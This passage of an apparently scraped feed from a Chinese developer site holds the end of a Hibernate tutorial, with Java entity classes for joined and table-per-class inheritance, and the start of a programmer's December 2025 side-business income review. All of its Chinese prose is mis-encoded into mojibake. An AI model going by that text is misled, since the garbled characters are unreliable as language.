        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            List&lt;Person&gt; persons = session.createQuery(<span class="hljs-string">"FROM Person"</span>, Person.class).list();
            <span class="hljs-keyword">for</span> (Person person : persons) {
                System.out.println(<span class="hljs-string">"Person: "</span> + person.getName());
                <span class="hljs-keyword">if</span> (person <span class="hljs-keyword">instanceof</span> Employee) {
                    System.out.println(<span class="hljs-string">"Employee Salary: "</span> + ((Employee) person).getSalary());
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (person <span class="hljs-keyword">instanceof</span> Student) {
                    System.out.println(<span class="hljs-string">"Student Major: "</span> + ((Student) person).getMajor());
                }
            }
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-8">è¡¨è¿æ¥ç»§æ‰¿ï¼ˆJoined Table Inheritanceï¼‰</h3>
<p>åœ¨è¡¨è¿æ¥ç»§æ‰¿ç­–ç•¥ä¸­ï¼Œä¸ºæ¯ä¸ªç±»åˆ›å»ºç‹¬ç«‹çš„è¡¨ï¼Œå­ç±»è¡¨åŒ…å«è‡ªå·±çš„å±æ€§å¹¶é€šè¿‡å¤–é”®å¼•ç”¨çˆ¶ç±»è¡¨ä¸­çš„è®°å½•ã€‚</p>
<h4 data-id="heading-9">ç¤ºä¾‹</h4>
<h5 data-id="heading-10">å®ä½“ç±»</h5>
<h6 data-id="heading-11">çˆ¶ç±» <code>Person</code></h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Inheritance(strategy = InheritanceType.JOINED)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-comment">// constructors, getters, and setters</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }
}
</code></pre>
<h6 data-id="heading-12">å­ç±» <code>Employee</code></h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> salary;

    <span class="hljs-comment">// constructors, getters, and setters</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> salary)</span> {
        <span class="hljs-built_in">super</span>(name);
        <span class="hljs-built_in">this</span>.salary = salary;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getSalary</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> salary;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSalary</span><span class="hljs-params">(<span class="hljs-type">double</span> salary)</span> {
        <span class="hljs-built_in">this</span>.salary = salary;
    }
}
</code></pre>
<h6 data-id="heading-13">å­ç±» <code>Student</code></h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-keyword">private</span> String major;

    <span class="hljs-comment">// constructors, getters, and setters</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, String major)</span> {
        <span class="hljs-built_in">super</span>(name);
        <span class="hljs-built_in">this</span>.major = major;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMajor</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> major;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMajor</span><span class="hljs-params">(String major)</span> {
        <span class="hljs-built_in">this</span>.major = major;
    }
}
</code></pre>
<p>æŸ¥è¯¢å’Œæ’å…¥æ•°æ®çš„ä»£ç ä¸å•è¡¨ç»§æ‰¿çš„ç¤ºä¾‹ç›¸åŒã€‚</p>
<h3 data-id="heading-14">è¡¨æ¯ç±»ç»§æ‰¿ï¼ˆTable Per Class Inheritanceï¼‰</h3>
<p>åœ¨è¡¨æ¯ç±»ç»§æ‰¿ç­–ç•¥ä¸­ï¼Œæ¯ä¸ªå…·ä½“ç±»éƒ½æœ‰è‡ªå·±çš„ç‹¬ç«‹è¡¨ï¼Œä¸å­˜å‚¨çˆ¶ç±»ä¿¡æ¯ï¼Œæ‰€æœ‰å­—æ®µï¼ˆåŒ…æ‹¬çˆ¶ç±»çš„å­—æ®µï¼‰éƒ½åœ¨å­ç±»è¡¨ä¸­ã€‚</p>
<h4 data-id="heading-15">ç¤ºä¾‹</h4>
<h5 data-id="heading-16">å®ä½“ç±»</h5>
<h6 data-id="heading-17">çˆ¶ç±» <code>Person</code></h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Inheritance(strategy = InheritanceType.TABLE_PER_CLASS)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.TABLE)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-comment">// constructors, getters, and setters</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }
}
</code></pre>
<h6 data-id="heading-18">å­ç±» <code>Employee</code></h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> salary;

    <span class="hljs-comment">// constructors, getters, and setters</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> salary)</span> {
        <span class="hljs-built_in">super</span>(name);
        <span class="hljs-built_in">this</span>.salary = salary;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getSalary</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> salary;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSalary</span><span class="hljs-params">(<span class="hljs-type">double</span> salary)</span> {
        <span class="hljs-built_in">this</span>.salary = salary;
    }
}
</code></pre>
<h6 data-id="heading-19">å­ç±» <code>Student</code></h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-keyword">private</span> String major;

    <span class="hljs-comment">// constructors, getters, and setters</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, String major)</span> {
        <span class="hljs-built_in">super</span>(name);
        <span class="hljs-built_in">this</span>.major = major;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMajor</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> major;
    }

    
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¨‹åºå‘˜å‰¯ä¸š | 2025å¹´12æœˆå¤ç›˜]]></title>    <link>https://juejin.cn/post/7589958976227344394</link>    <guid>https://juejin.cn/post/7589958976227344394</guid>    <pubDate>2026-01-02T15:06:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589958976227344394" data-draft-id="7590326071413719090" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¨‹åºå‘˜å‰¯ä¸š | 2025å¹´12æœˆå¤ç›˜"/> <meta itemprop="keywords" content="åç«¯,åˆ›ä¸š"/> <meta itemprop="datePublished" content="2026-01-02T15:06:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å˜Ÿå˜ŸMD"/> <meta itemprop="url" content="https://juejin.cn/user/3368559354851470"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¨‹åºå‘˜å‰¯ä¸š | 2025å¹´12æœˆå¤ç›˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559354851470/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å˜Ÿå˜ŸMD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T15:06:01.000Z" title="Fri Jan 02 2026 15:06:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"ã€Œ"}.markdown-body b:after,.markdown-body strong:after{content:"ã€"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2557cd7a86814ef8af74fe2f6ba77795~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=900&amp;h=383&amp;s=91599&amp;e=jpg&amp;b=64a5ef" alt="å¿…çœ‹å¤§å­—æœ€æ–°æ¶ˆæ¯é‡ç£…å…¬ä¼—å·é¦–å›¾(2) (1).jpg" loading="lazy"/></p>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FUJXHYrD_cfoIYeBStWEWqg" target="_blank" title="https://mp.weixin.qq.com/s/UJXHYrD_cfoIYeBStWEWqg" ref="nofollow noopener noreferrer">å˜Ÿçˆ·åˆ›ä¸šæ—¥è®°</a>Â ã€‚ æˆ‘å·²ç»åšæŒæ—¥æ›´600å¤©+ï¼Œæ¬¢è¿è¿‡æ¥è¿½å‰§~</p>
</blockquote>
<blockquote>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å˜Ÿå˜ŸMDï¼Œä¸€ä¸ª10å¹´ç¨‹åºå‘˜ï¼Œç°åœ¨ç¦»èŒåˆ›ä¸šï¼Œæœ‰700å¤©äº†ï¼Œæˆ‘æ¯ä¸ªæœˆéƒ½ä¼šå†™ä¸€ç¯‡æ€»ç»“å¤ç›˜ï¼Œè®©å¤§å®¶å¯ä»¥è¿‘è·ç¦»çœ‹çœ‹ä¸€ä¸ªç¦»èŒç¨‹åºå‘˜éƒ½åœ¨å¹²ä»€ä¹ˆï¼Œä»Šå¤©è¿™ç¯‡æ˜¯åäºŒæœˆä»½çš„æ€»ç»“ï¼Œå¤§æ¦‚2000å­—ï¼Œç•¥é•¿ï¼Œæœ‰ç©ºçš„å¯ä»¥ç¿»ç¿»ï¼Œå¸Œæœ›å¯¹å¤§å®¶æœ‰ä¸€ä¸¢ä¸¢çš„å€Ÿé‰´ä½œç”¨ï¼</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€æœˆåº¦å¤§äº‹</h2>
<p>ä»Šå¤©å…ˆæŠŠ12æœˆçš„å¤ç›˜å†™äº†ï¼Œ æ”¹å¤©å†æŠŠ25å¹´çš„å¤ç›˜æ•´ç†å“ˆï¼Œè¿™ä¸€å¹´è¿˜æ˜¯ç»å†äº†å¾ˆå¤šäº‹æƒ…ï¼Œéœ€è¦å¥½å¥½æ€»ç»“å¤ç›˜</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8023525e5f604425bd93e772ca6746b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zif5ZifTUQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767971161&amp;x-signature=ufk%2BPyYq13HMx0zf6yE68zBqGis%3D" alt="image.png" loading="lazy"/></p>
<p><strong>1ï¼šå…¬ä¼—å·è¿è¥+Bç«™è§†é¢‘è¿è¥</strong></p>
<p>å…¬ä¼—å·å’ŒBç«™è§†é¢‘è¿è¥ç›®å‰è¿˜æ˜¯æœ€é«˜ä¼˜å…ˆçº§ï¼Œå…ˆè¯´è¿™å—å†…å®¹ï¼Œæœ¬æœˆå…¬ä¼—å·å‘è¡¨29ç¯‡ï¼ˆ2ç¯‡è½¯æ–‡ï¼‰ï¼Œè§†é¢‘å·åˆ›ä½œ26ç¯‡ï¼Œæ–‡ç« æ›´å¤šä¸€äº›è¿™æ¬¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/022ffe39e8fc4206a7369ec9d02284fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zif5ZifTUQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767971161&amp;x-signature=TNIDpoHCXtNYXqa%2FYpSMHx08pYM%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™ä¸ªæœˆè¿˜æ˜¯å¾ˆå·çš„ï¼Œæ¯•ç«Ÿè¿™ä¸ªç®—æ˜¯ç›®å‰æœ€ç¨³å®šçš„æ”¶å…¥æ¥æºå•¦ï¼Œå¹³æ—¶å°±è·Ÿä¸Šç­ä¸€æ ·ï¼Œæ¯å¤©é†’æ¥æœ€ä¼˜å…ˆçš„äº‹æƒ…å°±æ˜¯æ‰¾é€‰é¢˜ï¼Œæµ‹è¯•å·¥ä½œæµï¼Œå†™æ–‡ç« ã€å½•è§†é¢‘ã€å‘å¸ƒã€‚åªæœ‰è¿™ä¸ªäº‹æƒ…åšå®Œäº†ï¼Œæˆ‘æ‰èƒ½æŠ½ç©ºå¤„ç†å…¶ä»–çš„äº‹æƒ…ã€‚</p>
<p>ä¸è¿‡æœ‰æ—¶å€™äº‹æƒ…å¤ªå¤šäº†ï¼Œæ¯”å¦‚çº¿ä¸‹å›¢é˜Ÿçš„äº‹æƒ…ï¼Œè¦å»ç°åœºå¼€ä¼šè®¨è®ºå•¥çš„ï¼Œå¥½å‡ æ¬¡æ™šä¸Š11ç‚¹åˆ°å®¶ï¼Œ1ä¸ªå°æ—¶å†…ç«æ€¥ç«ç‡çš„èµ¶ç€å†™æ–‡ç« ï¼Œä¹ŸæŒºä¸å®¹æ˜“å“ˆå“ˆã€‚</p>
<p>æ›´æ–°ä¸‹æˆ‘ç›®å‰å‡ ä¸ªå·çš„ç²‰ä¸ä½“é‡ï¼Œè¿˜æ˜¯Bç«™å¢é•¿ç¨³å®šã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25da068fb9154640b51e2cde38509137~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zif5ZifTUQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767971161&amp;x-signature=KxHR1pLEOx0SDENkpIjtyVLEkXI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Youtubeè¿™å—è¿›åº¦æ¯”æˆ‘è®¾æƒ³çš„è¦å¿«å‘¢ï¼Œæ²¡æƒ³åˆ°å¹´å‰å°±4000å°æ—¶æ’­æ”¾è¾¾æˆï¼Œç›´æ¥ç”³è¯·äº†å¼€é€šYPPï¼Œå¯ä»¥å¼€å§‹èµšç¾åˆ€äº†ï¼Œæœ€è¿‘çœ‹äº†ä¸‹ï¼Œè§†é¢‘æ’­æ”¾å·²ç»æœ‰5åˆ€çš„æ”¶ç›Šäº†ï¼Œèµšç¾åˆ€çš„æ„Ÿè§‰çœŸçˆ½å•Šï¼Œç»ˆäºç†¬å‡ºå¤´äº†ï¼Œæ˜å¹´åˆå¤šäº†ä¸€æ¡æ”¶ç›Šæ¸ é“ï¼Œå‰æœŸä¸å¤šï¼Œä½†æ˜¯æˆ‘å¯ä»¥ç†¬å˜¿å˜¿ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/851e55c881c34f9aaaf4a032523c5861~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zif5ZifTUQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767971161&amp;x-signature=FAVONoKBk077KrZm%2FKNadReLtcw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>2ï¼šå•†å•ä¸šåŠ¡å’Œæ¥å¹¿ä¸šåŠ¡</strong></p>
<p>è¿™ä¸ªæœˆçš„è½¯æ–‡å’Œå•†å•è¿˜è¡Œï¼Œä¸­è§„ä¸­çŸ©ï¼Œåˆšå¥½åƒçš„è¿‡æ¥ï¼Œæœ‰ä¸€äº›è¿˜åœ¨æ¨è¿›çš„å°±æ²¡ç»Ÿè®¡ï¼Œå…¶å®è¿™ä¸ªå•†å•+è½¯æ–‡æ¨å¹¿çš„ç®—æ˜¯ä¸ç¡®å®šæ€§æ”¶ç›Šï¼Œæœ‰é«˜æœ‰ä½ï¼Œå¥½çš„æ—¶å€™ç ´ä¸‡ï¼Œå·®çš„æ—¶å€™å°å‡ åƒï¼Œéƒ½æ˜¯ç¬¦åˆæˆ‘è‡ªå·±èµ›é“çš„ï¼Œè¿™äº›å®¢æˆ·å¤§éƒ¨åˆ†éƒ½æ˜¯é€šè¿‡å…¬åŸŸé“¾æ¥è¿‡æ¥çš„ï¼Œæ ¸å¿ƒè¿˜æ˜¯æˆ‘æŒç»­çš„åšå†…å®¹ï¼Œæœ‰æ›å…‰æ‰æœ‰æ–°çš„å®¢æˆ·æºæºä¸æ–­é“¾æ¥ï¼Œæ˜å¤©ç»§ç»­åšæŒåšå•¦ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bf468b0c45a4dbd95b25643d1767761~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zif5ZifTUQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767971161&amp;x-signature=XKyx8g6jcjV%2FT%2BPlXiYT2LwoUN4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>3ï¼šçº¿ä¸‹å…¬å¸æˆç«‹+é¡¹ç›®æ¨è¿›</strong></p>
